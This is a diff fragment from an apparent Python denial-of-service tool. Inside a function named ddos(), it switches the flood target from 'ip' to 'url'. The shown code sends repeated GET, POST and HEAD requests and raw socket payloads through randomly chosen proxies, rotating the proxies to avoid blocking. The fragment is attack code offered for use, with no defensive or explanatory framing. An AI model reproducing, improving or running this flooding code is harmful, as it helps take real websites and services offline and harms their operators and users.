@@ -2549,8 +2549,8 @@ def ddos():
                     'https://': 'http://'+random.choice(proxz),
                 }
              )
-            client.get(ip, headers=headers, proxw=proxy)
-            client.get(ip, headers=headers, proxw=proxy)
+            client.get(url, headers=headers, proxw=proxy)
+            client.get(url, headers=headers, proxw=proxy)
             proxy = {
                     'http': 'http://'+str(random.choice(list(proxz))),   
                     'https': 'http://'+str(random.choice(list(proxz))),
@@ -2567,9 +2567,9 @@ def ddos():
             s.send(data)
             s.send(data)
             s.send(data)
-            scraper.get(ip, timeout=180)
-            scraper.post(ip, timeout=180)
-            scraper.head(ip, timeout=1800)
+            scraper.get(url, timeout=180)
+            scraper.post(url, timeout=180)
+            scraper.head(url, timeout=1800)
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
